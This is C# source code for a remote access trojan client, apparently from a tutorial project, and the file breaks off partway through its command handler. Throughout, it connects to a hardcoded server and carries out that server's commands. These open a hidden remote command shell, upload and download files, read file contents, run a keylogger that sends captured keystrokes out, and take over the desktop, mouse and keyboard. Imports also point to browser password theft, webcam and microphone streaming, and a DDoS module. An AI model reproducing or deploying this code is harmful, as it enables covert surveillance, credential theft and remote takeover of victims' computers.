#undef EnableAutoBypass
#undef HideWindow
using AForge.Video; //For webcam streaming
using AForge.Video.DirectShow; //For webcam streaming
using appCom; //For communication with the proxy server
using Microsoft.Win32; //For registry operations
using System; // For basic system functions
using System.Collections.Generic; //For dictrionary and list objects
using System.Data.SQLite; //For reading chrome's sqlite passwords file
using System.Diagnostics; //For process management
using System.Drawing; //For graphics
using System.IO; //For file operations
using System.Management; //For creating shortcut (.lnk) files
using System.Net; //For network information
using System.Net.Security;
using System.Net.Sockets; //For client sockets
using System.Runtime.InteropServices; //For p/invokes
using System.Security.Cryptography; //For encrypt and decrypt
using System.Security.Cryptography.X509Certificates;
using System.Text; //For encoding
using System.Threading; //For threads
using System.Threading.Tasks;
using System.Windows.Forms; //For form fucntions
using UrlHistoryLibrary; //For reading IE's history file

/// <summary>
/// The R.A.T Client
/// </summary>
namespace TutClient
{
    /// <summary>
    /// The main module
    /// </summary>
    class Program
    {
        /// <summary>
        /// Frame rate control variable
        /// </summary>
        public static int fps = 100;

        /// <summary>
        /// MCI Send String for openind the CD Tray
        /// </summary>
        /// <param name="lpstrCommand">Command</param>
        /// <param name="lpstrReturnString">Return Value</param>
        /// <param name="uReturnLength">Return value's length</param>
        /// <param name="hwndCallback">Callback's handle</param>
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
        string lpstrReturnString, int uReturnLength, int hwndCallback);
        /// <summary>
        /// Find window for reading data from PasswordFox
        /// </summary>
        /// <param name="className">Window's class name</param>
        /// <param name="windowText">The text of the window</param>
        /// <returns>The handle of the window</returns>
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        /// <summary>
        /// Show Window for hiding password fox's window, while still reading passwords from it
        /// </summary>
        /// <param name="hwnd">The handle of the window</param>
        /// <param name="command">The command to send</param>
        /// <returns>The success</returns>
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        /// <summary>
        /// Find a child window, for PF's listView
        /// </summary>
        /// <param name="hWnd1">The handle of the parent window</param>
        /// <param name="hWnd2">The handle of the control to get the next child after</param>
        /// <param name="lpsz1">The class of the window</param>
        /// <param name="lpsz2">The text of the window</param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern int FindWindowEx(int hWnd1, int hWnd2, string lpsz1, string lpsz2);
        /// <summary>
        /// Detect shutdown, logout ctrl c, and other signals to notify the server when disconnecting
        /// </summary>
        /// <param name="handler">The event handler to attach</param>
        /// <param name="add">True if the event handler should be added, otherwise false</param>
        /// <returns>The success</returns>
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
        /// <summary>
        /// Generate a mouse event
        /// </summary>
        /// <param name="dwFlags">The ID of the click to do</param>
        /// <param name="dx"></param>
        /// <param name="dy"></param>
        /// <param name="dwData"></param>
        /// <param name="dwExtraInfo"></param>
        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        /// <summary>
        /// Signal Event Handler
        /// </summary>
        /// <param name="sig">The signal sent by the OS</param>
        /// <returns>True if the signal is handled</returns>
        private delegate bool EventHandler(CtrlType sig);
        /// <summary>
        /// New signal handler
        /// </summary>
        static EventHandler _handler;

        /// <summary>
        /// Shutdown signal types
        /// </summary>
        enum CtrlType
        {
            /// <summary>
            /// Control + C pressed
            /// </summary>
            CTRL_C_EVENT = 0,
            /// <summary>
            /// Break pressed
            /// </summary>
            CTRL_BREAK_EVENT = 1,
            /// <summary>
            /// Window closed
            /// </summary>
            CTRL_CLOSE_EVENT = 2,
            /// <summary>
            /// User logged off
            /// </summary>
            CTRL_LOGOFF_EVENT = 5,
            /// <summary>
            /// User stopped the OS
            /// </summary>
            CTRL_SHUTDOWN_EVENT = 6
        }

        /// <summary>
        /// R.A.T Remote Error Codes
        /// </summary>
        public enum ErrorType
        {
            /// <summary>
            /// File can't be located
            /// </summary>
            FILE_NOT_FOUND = 0x00,
            /// <summary>
            /// Access to process is denied, when killing
            /// </summary>
            PROCESS_ACCESS_DENIED = 0x01,
            /// <summary>
            /// Cannot encrypt data
            /// </summary>
            ENCRYPT_DATA_CORRUPTED = 0x02,
            /// <summary>
            /// Cannot decrypt data
            /// </summary>
            DECRYPT_DATA_CORRUPTED = 0x03,
            /// <summary>
            /// Cannot find the specified directory
            /// </summary>
            DIRECTORY_NOT_FOUND = 0x04,
            /// <summary>
            /// Invalid device selected with mic or cam stream
            /// </summary>
            DEVICE_NOT_AVAILABLE = 0x05,
            /// <summary>
            /// Password recovery failed
            /// </summary>
            PASSWORD_RECOVERY_FAILED = 0x06,
            /// <summary>
            /// Error, when reading from the remote CMD module
            /// </summary>
            CMD_STREAM_READ = 0X07,
            /// <summary>
            /// Cannot find specified path
            /// </summary>
            FILE_AND_DIR_NOT_FOUND = 0x08,
            /// <summary>
            /// Specified file already exists
            /// </summary>
            FILE_EXISTS = 0x09,
            /// <summary>
            /// Elevated privileges are required to run this module
            /// </summary>
            ADMIN_REQUIRED = 0x10
        }

        /// <summary>
        /// Custom signal handler
        /// </summary>
        /// <param name="sig">The incoming signal</param>
        /// <returns>True if the signal is handled</returns>
        private static bool Handler(CtrlType sig)
        {
            //In every case shutdown existing IPC connections and notify the server of the disconnect

            switch (sig)
            {
                case CtrlType.CTRL_C_EVENT:
                    StopIPCHandler();
                    SendCommand("dclient");
                    return true;
                case CtrlType.CTRL_LOGOFF_EVENT:
                    StopIPCHandler();
                    SendCommand("dclient");
                    return true;
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                    StopIPCHandler();
                    SendCommand("dclient");
                    return true;
                case CtrlType.CTRL_CLOSE_EVENT:
                    StopIPCHandler();
                    SendCommand("dclient");
                    //Thread.Sleep(1000);
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Mouse Event Codes
        /// </summary>
        [Flags]
        public enum MouseEventFlags
        {
            /// <summary>
            /// Press down the left click
            /// </summary>
            LEFTDOWN = 0x00000002,
            /// <summary>
            /// Release the left click
            /// </summary>
            LEFTUP = 0x00000004,
            /// <summary>
            /// Press down the middle (scroll) button
            /// </summary>
            MIDDLEDOWN = 0x00000020,
            /// <summary>
            /// Release the middle (scroll) button
            /// </summary>
            MIDDLEUP = 0x00000040,
            /// <summary>
            /// Move the mouse
            /// </summary>
            MOVE = 0x00000001,
            /// <summary>
            /// ?
            /// </summary>
            ABSOLUTE = 0x00008000,
            /// <summary>
            /// Press down the right click
            /// </summary>
            RIGHTDOWN = 0x00000008,
            /// <summary>
            /// Release the right click
            /// </summary>
            RIGHTUP = 0x00000010
        }

        /// <summary>
        /// Show window code -> HIDE
        /// </summary>
        private const int SW_HIDE = 0;
        /// <summary>
        /// Show window code -> SHOW
        /// </summary>
        private const int SW_SHOW = 1;

        /// <summary>
        /// The client socket
        /// </summary>
        private static Socket _clientSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        /// <summary>
        /// The port to connect to
        /// </summary>
        private const int _PORT = 100; // same as server port

        /// <summary>
        /// STDOUT from remote CMD
        /// </summary>
        private static StreamReader fromShell;
        /// <summary>
        /// STDIN to remote CMD
        /// </summary>
        private static StreamWriter toShell;
        /// <summary>
        /// STDERR from remote CMD
        /// </summary>
        private static StreamReader error;

        private static String fup_location = "";
        private static int fup_size = 0;
        private static bool isFileDownload = false;
        private static int writeSize = 0;
        private static byte[] recvFile = new byte[1];
        private static String fdl_location = "";
        private static bool isDisconnect = false;
        private static bool isKlThreadRunning = false;
        private static NAudio.Wave.WaveInEvent streaming;
        private static VideoCaptureDevice source;
        private static DDoS DDoS;
        private static Process cmdProcess;
        private const bool applicationHidden = false;
        private static Client _ipcClient;
        private static ProcessData ipcProcess;
        private static string getScreens; //get screens count
        public static int ScreenNumber = 0;
        public static bool IsLinuxServer = false;
        public static Encoding encoder;
        public static SslStream _sslClient;
        public static string LocalIPCache = string.Empty;
        public static string LocalAVCache = string.Empty;

        /// <summary>
        /// R.A.T Entry point
        /// </summary>
        /// <param name="args">Command-Line arguments</param>
        static void Main(string[] args)
        {
#if HideWindow
            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
#endif
            _handler += new EventHandler(Handler); //Create a new handler
            SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
            ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
            ConnectToServer(); //Connect to the R.A.T Server
            StartIPCHandler(); //Start IPC Manager
            RequestLoop(); //Request command from the server
        }

        /// <summary>
        /// Stop the IPC Handler and kill out client
        /// </summary>
        private static void StopIPCHandler()
        {
            if (_ipcClient == null) return; //Check if the client is running
            _ipcClient.StopPipe(); //Stop the client
            _ipcClient = null; //Set the client to null
        }

        /// <summary>
        /// Start handling IPC connections
        /// </summary>
        private static void StartIPCHandler()
        {
            Client ipcClient = new Client(); //Create a new IPC client
            ipcClient.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC); //Subscribe to the message receiver
            _ipcClient = ipcClient; //Set the global client
        }

        /// <summary>
        /// Start IPC Child processes
        /// </summary>
        /// <param name="servername">The server to start</param>
        private static void LaunchIPCChild(string servername)
        {
            string filepath = ""; //The path to the server's exe file
            if (servername == "tut_client_proxy") //If the proxy server is specified
            {
                filepath = @"proxy\proxyServer.exe"; //Set the proxy server's path
            }

            ProcessData tempProcess = ProcessData.CheckProcessName("proxyServer", "tut_client_proxy"); //Get the process data of the proxySevrer
            ipcProcess = tempProcess; //Set the global IPC Process

            if ((ipcProcess != null && !ipcProcess.IsPipeOnline("tut_client_proxy")) || ipcProcess == null) //Check if the server is offline
            {
                Process p = new Process(); //Create a new process object
                p.StartInfo.FileName = filepath; //Set the exe path
                p.StartInfo.Arguments = "use_ipc"; //Specify the IPC flag for the proxy
                p.Start(); //Start the proxy Server
                ipcProcess = new ProcessData(p.Id, "tut_client_proxy"); //Get a new process data
                Thread.Sleep(1500); //Wait for the server to start
            }

            _ipcClient.ConnectPipe("tut_client_proxy", 0); //Connect to the server
        }

        /// <summary>
        /// IPC Receive Messages Callback
        /// </summary>
        /// <param name="e">Message event args</param>
        private static void ReadIPC(ClientMessageEventArgs e)
        {
            string msg = e.Message; //Get the message
            Console.WriteLine("IPC Message: " + msg);
            SendCommand("ipc§" + "tut_client_proxy" + "§" + msg); //Forward output to R.A.T Server
        }

        /// <summary>
        /// Resolve a DNS name into an IP Address
        /// </summary>
        /// <param name="input">The DNS name to resolve</param>
        /// <returns>The IP Address if resolvation is successful, otherwise null</returns>
        private static string ResolveDns(string input)
        {
            try
            {
                string ipAddr = Dns.GetHostAddresses(input)[0].ToString(); //Try to get the first result
                return ipAddr; //Return the IP Address
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
                return null; //Return null
            }
        }

        /// <summary>
        /// Convert a connection string to an IP Address
        /// </summary>
        /// <param name="input">The connection string</param>
        /// <returns>The IP Address of the R.A.T Server if can be parsed, otherwise false</returns>
        private static string GetIPAddress(string input)
        {
            if (input == "") return null; //Filter empty input
            bool validIP = true; //True if input is a valid IP

            if (input.Contains(".")) //Input contains dots
            {
                string[] parts = input.Split('.'); //Get the octects
                if (parts.Length == 4) //If 4 octets present
                {
                    foreach (string ipPart in parts) //Loop throught them
                    {
                        for (int i = 0; i < ipPart.Length; i++) //Check char by char
                        {
                            if (!char.IsNumber(ipPart[i])) //If char isn't a nuber, then input isn't an IP
                            {
                                validIP = false; //Invalid for IP
                                break; //Break out
                            }
                        }

                        if (!validIP) //Invalid IP Address
                        {
                            Console.WriteLine("Invalid IP Address!\r\nInput is not an IP Address");
                            break; //Break
                        }
                    }

                    if (validIP) //IP was valid
                    {
                        return input; //Return the IP
                    }
                    else //Invalid IP
                    {
                        //Pretend that the input is a hostname
                        return ResolveDns(input);
                    }
                }
                else //input doesn't have 4 parts, but it can be still a hostname
                {
                    return ResolveDns(input); //Get the IP of the DNS name
                }
            }

            return null; //All parsing failed at this point
        }

        /// <summary>
        /// Connect to the R.A.T Server
        /// </summary>
        private static void ConnectToServer()
        {
            int attempts = 0; //Connection attempts to the server
            string ipCache = GetIPAddress("192.168.10.20"); //Replace IP with DNS if you want
            if (IsLinuxServer) encoder = Encoding.UTF8;
            else encoder = Encoding.Unicode;

            while (!_clientSocket.Connected) //Connect while the client isn't connected
            {
                try
                {
                    attempts++; //1 more attempt
                    Console.WriteLine("Connection attempt " + attempts);


                    _clientSocket.Connect(IPAddress.Parse(ipCache), _PORT); //Try to connect to the server
                    Thread.Sleep(500);
                }
                catch (SocketException) //Couldn't connect to server
                {
                    if (attempts % 5 == 0) ipCache = GetIPAddress("192.168.10.40"); // Update ip cache every 5 failed attempts
                    //Shutdown the remote desktop
                    if (RDesktop.isShutdown == false)
                    {
                        RDesktop.isShutdown = true;
                    }
                    Console.Clear();
                }
            }

            Console.Clear();
            Console.WriteLine("Connected"); //Client connected
        }

        /// <summary>
        /// Read commands from the server
        /// </summary>
        private static void RequestLoop()
        {
            if (IsLinuxServer)
            {
                _sslClient = new SslStream(new NetworkStream(_clientSocket), false, new RemoteCertificateValidationCallback(ValidateSSLConnection), null);
                _sslClient.AuthenticateAsClient("");
                LaunchHearthbeat();
            }

            while (true) //While the connection is alive
            {
                //SendRequest();
                if (isDisconnect) break; //If we need to disconnect, then break out
                ReceiveResponse(); // Receive data from the server
            }

            Console.WriteLine("Connection Ended"); //Disconnected at this point
            //Shutdown the client, then reconnect to the server
            _clientSocket.Shutdown(SocketShutdown.Both);
            _clientSocket.Close();
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectToServer();
            isDisconnect = false;
            RequestLoop();
        }

        private static void LaunchHearthbeat()
        {
            Task t = new Task(() =>
            {

                while (true)
                {
                    if (_clientSocket.Connected && _sslClient != null && _sslClient.CanWrite)
                    {
                        SendCommand("hearthbeat");
                    }

                    Thread.Sleep(10000);
                }

            });

            t.Start();
        }

        private static bool ValidateSSLConnection(object sender, X509Certificate senderCert, X509Chain certChain, SslPolicyErrors errorPolicy)
        {
            return true; // TODO: add certificate pinning functionallity
        }

        /// <summary>
        /// Report a client-side error to the R.A.T Server
        /// </summary>
        /// <param name="type">The error type/code</param>
        /// <param name="title">The short title of the error</param>
        /// <param name="message">The longer message of the error</param>
        public static void ReportError(ErrorType type, string title, string message)
        {
            StringBuilder error = new StringBuilder();
            // Create command
            error.Append("error§")
                .Append(type).Append("§")
                .Append(title).Append("§")
                .Append(message);
            SendCommand(error.ToString()); //Send to server
        }

        /// <summary>
        /// Get commands from multiple TCP packets incoming as one
        /// </summary>
        /// <param name="rawData">The string converted incoming data</param>
        /// <returns>An array of command sent by the server</returns>
        private static string[] GetCommands(string rawData)
        {
            List<string> commands = new List<string>(); //The command sent by the server
            int readBack = 0; //How much to read back from the current char pointer

            for (int i = 0; i < rawData.Length; i++) // Go through the message
            {
                char current = rawData[i]; //Get the current character
                if (current == '§') //If we see this char -> message delimiter
                {
                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack)); //Get the length of the command string
                    string command = rawData.Substring(i + 1, dataLength); //Get the command string itself
                    i += 1 + dataLength; //Skip the current command
                    readBack = i; //Set the read back point to here
                    commands.Add(command); //Add this command to the list
                }
            }

            return commands.ToArray(); //Return the command found
        }

        /// <summary>
        /// Handle the commands from the server
        /// </summary>
        /// <param name="text">The plaintext command message</param>
        private static void HandleCommand(string text)
        {
            if (text == "tskmgr")// i added this to start task manager
            {
                Process p = new Process(); //Create a new process object
                p.StartInfo.FileName = "Taskmgr.exe"; //Task Manager
                p.StartInfo.CreateNoWindow = true; //Don't draw the window of the task manager
                p.Start(); //Start the process
            }

            else if (text == "fpslow")    //FPS 
            {
                fps = 150;
                Console.WriteLine("FPS now 150");
            }
            else if (text == "fpsbest")      //FPS 
            {
                fps = 80;
                Console.WriteLine("FPS now 80");
            }
            else if (text == "fpshigh")      //FPS
            {
                fps = 50;
                Console.WriteLine("FPS now 50");
            }
            else if (text == "fpsmid")      //FPS 
            {
                fps = 100;
                Console.WriteLine("FPS now 100");
            }
            else if (text.StartsWith("getinfo-")) //Server requested info
            {
                string myid = text.Substring(8); //get the client id
                StringBuilder command = new StringBuilder();
                command.Append("infoback;")
                    .Append(myid).Append(";")
                    .Append(Environment.MachineName).Append("|")
                    .Append(GetLocalIPAddress()).Append("|")
                    .Append(DateTime.Now.ToString()).Append("|")
                    .Append(AvName());
                SendCommand(command.ToString()); //Send the response to the server
            }
            else if (text.StartsWith("msg")) //Display a messagebox
            {
                CreateMessage(text.Split('|')); //Parse the data and show the messagebox
            }
            else if (text.StartsWith("freq-")) //Play a freuqency
            {
                int freq = int.Parse(text.Substring(5)); //Get the target frequency
                GenerateFreq(freq, 2); //Play that frequency for 2 seconds
            }
            else if (text.StartsWith("sound-")) //Play a system sound
            {
                string snd = text.Substring(6); //Get the ID of the sound
                PlaySystemSound(snd);
            }
            else if (text.StartsWith("t2s|")) //Text to speech
            {
                string txt = text.Substring(4); //Get the text to read
                T2S(txt); //Read the text
            }
            else if (text.StartsWith("cd|")) //Manipulate the CD Tray
            {
                string opt = text.Substring(4); //Get the desired state of the CD Tray

                if (opt == "open") //Open it
                {
                    mciSendStringA("set CDAudio door open", "", 127, 0);
                }
                else //Close it
                {
                    mciSendStringA("set CDAudio door closed", "", 127, 0);
                }
            }
            else if (text.StartsWith("emt|")) //Manipulate windows elements
            {
                string[] data = text.Split('|');
                string action = data[1]; //Hide/Show
                string element = data[2]; //The element to manipulate

                ShowHideElement(action, element);
            }
            else if (text == "proclist") //List the running processes
            {
                Process[] allProcess = Process.GetProcesses(); //Get the list of running processes
                StringBuilder response = new StringBuilder();

                foreach (Process proc in allProcess) //Go through the processes
                {
                    response.Append("setproc|")
                        .Append(proc.ProcessName).Append("|") //Get the name of the process
                        .Append(proc.Responding).Append("|") // Get if the process is responding
                        .Append(proc.MainWindowTitle == "" ? "N/A" : proc.MainWindowTitle).Append("|"); // Get the main window's title

                    string priority = "N/A";
                    string path = "N/A";

                    try
                    {
                        priority = proc.PriorityClass.ToString(); //Get process priority
                        path = proc.Modules[0].FileName; //Get process executable path
                    }
                    catch (Exception) // 32-bit can't get 64-bit processes path / non-admin rights catch
                    {
                    }

                    response.Append(priority).Append("|")
                        .Append(path).Append("|")
                        .Append(proc.Id).Append("\n"); //Get the ID of the process
                }

                SendCommand(response.ToString()); //Send the response to the server
            }
            else if (text.StartsWith("prockill")) //Kill a process
            {
                int id = int.Parse(text.Substring(9)); //Get the ID of the process ot kill
                try
                {
                    Process.GetProcessById(id).Kill(); //Try to kill the process
                }
                catch (Exception) //Failed to kill it
                {
                    //Console.WriteLine(e.Message);
                    ReportError(ErrorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id); //Report to the server
                }
            }
            else if (text.StartsWith("procstart")) //Create a new process
            {
                try
                {
                    string[] data = text.Split('|');
                    Process p = new Process(); //Create the new process's object

                    p.StartInfo.FileName = data[1]; //Set the file to start

                    // Set the window style of the process
                    if (data[2] == "hidden") p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Check the window style of the process to start
                    // Normal window style is set by default, no need of else

                    p.Start(); //Start the process
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (text == "startcmd") //Start the remote cmd module
            {
                ProcessStartInfo info = new ProcessStartInfo
                {
                    FileName = "cmd.exe", //Set the file to cmd
                    CreateNoWindow = true, //Don't draw a window for it
                    UseShellExecute = false, //Don't use shell execution (needed to redirect the stdout, stdin and stderr)
                    RedirectStandardInput = true, //Redirect stdin
                    RedirectStandardOutput = true, //Redirect stdout
                    RedirectStandardError = true //Redirect stderr
                }; //Create a new startinfo object


                cmdProcess = new Process
                {
                    StartInfo = info
                }; //Create a new process object
                cmdProcess.Start(); //Start the cmd
                toShell = cmdProcess.StandardInput; //Get the stdin
                fromShell = cmdProcess.StandardOutput; //Get the stdout
                error = cmdProcess.StandardError; //Get the stderr
                toShell.AutoFlush = true; //Enable auto flushing

                // Get stdout and stderr from the shell
                GetShellOutput();
            }
            else if (text == "stopcmd") //Stop the remote cmd module
            {
                cmdProcess.Kill(); //Kill the process
                //Dispose the streams and the process itself
                toShell.Dispose();
                toShell = null;
                fromShell.Dispose();
                fromShell = null;
                cmdProcess.Dispose();
                cmdProcess = null;
            }
            else if (text.StartsWith("cmd§")) //Send command to the remote cmd module
            {
                string command = text.Substring(4); //The command to enter
                toShell.WriteLine(command + "\r\n"); //Send the command
            }
            else if (text == "fdrive") //List PC drives
            {
                DriveInfo[] drives = DriveInfo.GetDrives(); //Get the drives on the machine

                StringBuilder response = new StringBuilder();
                response.Append("fdrivel§");

                foreach (DriveInfo d in drives) //Go thorugh the drives
                {
                    if (d.IsReady) //Drive is ready (browsable)
                    {
                        // Get the name and size of the drive
                        response.Append(d.Name).Append("|")
                            .Append(d.TotalSize.ToString()).Append("\n");
                    }
                    else //Drive is not ready
                    {
                        // Get the name of the drive
                        response.Append(d.Name).Append("\n");
                    }
                }

                SendCommand(response.ToString()); //Respond to the server
            }
            else if (text.StartsWith("fdir§")) //List file and folders of a folder
            {
                string path = text.Substring(5); //The directory to list

                // Path is a file or invalid path
                if (path.Length == 3 && !path.EndsWith(":\\") || !Directory.Exists(path))
                {
                    ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path); //Report error to server
                    return;
                }

                string resp = GetFilesList(path); // Get the response to the command
                SendCommand(resp); //Send the response to the server
            }
            else if (text.StartsWith("f1§")) //Travel 1 directory up
            {
                string current = text.Substring(3); //Get the current directory

                if (current.Length == 3 && current.Contains(":\\")) //Parent dir is a drive
                {
                    SendCommand("f1§drive");
                }
                else //Parent dir is a folder
                {
                    String parent = new DirectoryInfo(current).Parent.FullName; //Get the full path of it's parent folder
                    SendCommand("f1§" + parent); //Send back the new path
                }
            }
            else if (text.StartsWith("fpaste§")) //Paste a file
            {
                string[] data = text.Split('§');
                string source = data[2]; //Source path of the file
                string target = data[1]; //Destionation of the file
                string mode = data[3]; //The mode (copy/move)
                string sourceType = "file"; //The source type (dir/file)

                if (!Directory.Exists(target)) //Destination isn't a directory
                {
                    ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager"); //Report to server
                    return;
                }
                if (Directory.Exists(source)) sourceType = "dir"; //Source is a folder
                PasteFileOrDir(source, target, mode, sourceType); // Paste the directory or file
            }
            else if (text.StartsWith("fexec§")) //Execute a file
            {
                string path = text.Substring(6); //The path to execute
                if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
                {
                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager"); //Report to server
                    return;
                }
                Process.Start(path); //Execute the file
            }
            else if (text.StartsWith("fhide§")) //Set the hidden attribute for a file
            {
                string path = text.Substring(6); //The file to hide
                if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
                {
                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path); //Report to the server
                    return;
                }
                File.SetAttributes(path, FileAttributes.Hidden); //Hide the file
            }
            else if (text.StartsWith("fshow§")) //Remove the hidden attribute from a file
            {
                String path = text.Substring(6); //The path of the file
                if (!File.Exists(path) && !Directory.Exists(path)) //Path is invalid
                {
                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path); //Report error to server
                    return;
                }
                File.SetAttributes(path, FileAttributes.Normal); //Set the file attributes to normal
            }
            else if (text.StartsWith("fdel§")) //Delete a file
            {
                string path = text.Substring(5); //Get the path of the file
                if (Directory.Exists(path)) //Path is a folder
                {
                    Directory.Delete(path, true); //Remove the folder recursive
                }
                else if (File.Exists(path)) //Path is a file
                {
                    File.Delete(path); //Remove the file
                }
                else //Invalid path
                {
                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path); //Report error to the server
                }
            }
            else if (text.StartsWith("frename§")) //Rename a file
            {
                string[] data = text.Split('§');
                string path = data[1]; //The path of the file to rename
                string name = data[2]; //The new name of the file
                if (Directory.Exists(path)) //Path is folder
                {
                    string target = new DirectoryInfo(path).Parent.FullName + "\\" + name; //Create the new path of the folder
                    Directory.Move(path, target); //Rename the folder
                }
                else //Path is a file
                {
                    if (!File.Exists(path)) //Path is a non-existent file
                    {
                        ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path); //Report the error to the server
                        return;
                    }
                    string target = new FileInfo(path).Directory.FullName + "\\" + name; //Create the new path of the file
                    File.Move(path, target); //Rename the file
                }
            }
            else if (text.StartsWith("ffile§")) //Create a new file
            {
                string[] data = text.Split('§');
                string fullPath = data[1] + "\\" + data[2]; //Create the path of the file

                //Overwrite existing
                if (File.Exists(fullPath)) File.Delete(fullPath);

                File.Create(fullPath).Close(); //Close the open stream, to prevent blocking access to the file
            }
            else if (text.StartsWith("fndir§")) //Create a new folder
            {
                string[] data = text.Split('§');
                String fullPath = data[1] + "\\" + data[2]; //Create the path of the new folder
                //Overwrite existing
                if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);

                Directory.CreateDirectory(fullPath); //Create the folder
            }
            else if (text.StartsWith("getfile§")) //Read the contents of a text based file
            {
                string path = text.Substring(8); //Get the path of the file
                if (!File.Exists(path)) //Path is not a file
                {
                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path); //Report error to server
                    return;
                }
                string content = File.ReadAllText(path); //Read the file
                string back = "backfile§" + content; //Create the response command
                SendCommand(back); //Send the file contents back to the server
            }
            else if (text.StartsWith("putfile§")) //Write contents of a text based file
            {
                string path = text.Split('§')[1]; //The path of the file to write
                string content = text.Split('§')[2]; //The content to write to the file

                if (!File.Exists(path)) //Path is not a file
                {
                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path); //Report error to the server
                    return;
                }
                File.WriteAllText(path, content); //Write all content to the file
            }
            else if (text.StartsWith("fup")) //Upload file
            {
                fup_location = text.Split('§')[1]; //Get the location of the new file
                if (File.Exists(fup_location)) //Check if the file already exists
                {
                    ReportError(ErrorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!"); //Report error to the server
                    return;
                }
                fup_size = int.Parse(text.Split('§')[2]); //Get the size of the file
                isFileDownload = true; //Set the socket to file download mode
                recvFile = new byte[fup_size]; //Create a new buffer for the file
                SendCommand("fconfirm"); //Confirm to start streaming the file
            }
            else if (text.StartsWith("fdl§")) //Download a file
            {
                fdl_location = text.Substring(4); //The file the server wants to download
                if (!File.Exists(fdl_location)) //File doesn't exist
                {
                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + fdl_location); //Report error to the server
                    return;
                }
                // TODO: rework file sending algorithm, send in chunks
                String size = (!IsLinuxServer) ? new FileInfo(fdl_location).Length.ToString() : Convert.ToBase64String(File.ReadAllBytes(fdl_location)).Length.ToString(); //Get the size of the file
                SendCommand("finfo§" + size); //Send the file's size to the server
            }
            else if (text == "fconfirm") //Server confirmed to receive a file
            {
                byte[] sendFile = File.ReadAllBytes(fdl_location); //Read the bytes of the file
                if (!IsLinuxServer)
                {
                    SendByte(sendFile); //Send the file to the server 
                }
                else
                {
                    SendCommand($"filestr{Convert.ToBase64String(sendFile)}");
                }
            }
            else if (text == "dc") //Server disconnected us
            {
                Thread.Sleep(3000); //Wait for the server to restart
                isDisconnect = true; //Set request breaking to true
                StopIPCHandler(); //Stop IPC connections
            }
            else if (text == "sklog") //Start the keylogger
            {
                if (!isKlThreadRunning) //Check if keylogger thread is not created
                {
                    //Create and start the keylogger
                    Thread t = new Thread(new ThreadStart(Keylogger.Logger));
                    t.Start();
                    isKlThreadRunning = true;
                }
                if (isKlThreadRunning && !Keylogger.letRun) //Thread is created but keylogger is stopped
                {
                    Keylogger.letRun = true; //Start the keylogger
                }

            }
            else if (text == "stklog") //Stop the keylogger
            {
                if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false; //If thread is created and keylogger is running, then stop it
            }
            else if (text == "rklog") //Read the keylogger's buffer
            {
                string dump = Keylogger.KeyLog; //Get the logger's buffer
                SendCommand("putklog" + dump); //Send the buffer to the server
            }
            else if (text == "cklog") //Clear the keylogger's buffer
            {
                Keylogger.LastWindow = ""; //Clear the last window var
                Keylogger.KeyLog = ""; //Clear the buffer of the logger
            }
            else if (text == "rdstart") //Start a remote desktop session
            {
                Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen)); //Create a new thread for the remote desktop
                RDesktop.isShutdown = false; //Enable the remote desktop to run
                rd.Start(); //Start the remote desktop
            }
            else if (text == "rdstop") //Stop the remote desktop
            {
                RDesktop.isShutdown = true; //Disable the remote desktop
            }
            else if (text.StartsWith("rmove-")) //Move the mouse
            {
                string t = text.Substring(6); //Get the command parts
                string[] x = t.Split(':'); //Get the coordinate parts
                Cursor.Position = new Point(int.Parse(x[0]), int.Parse(x[1])); //Set the position of the mouse
            }
            else if (text.StartsWith("rtype-")) //Type with the keyboard
            {
                //Console.WriteLine("received write command");
                string t = text.Substring(6); //Get the command parts
                if (t != "")
                {
                    SendKeys.SendWait(t); //Send the key to the OS

                    SendKeys.Flush(); //Flush to don't store the keys in a buffer
                }
            }
            else if (text.StartsWith("rclick-")) //Click with the mouse
            {
                string[] t = text.Split('-'); //Get the command parts
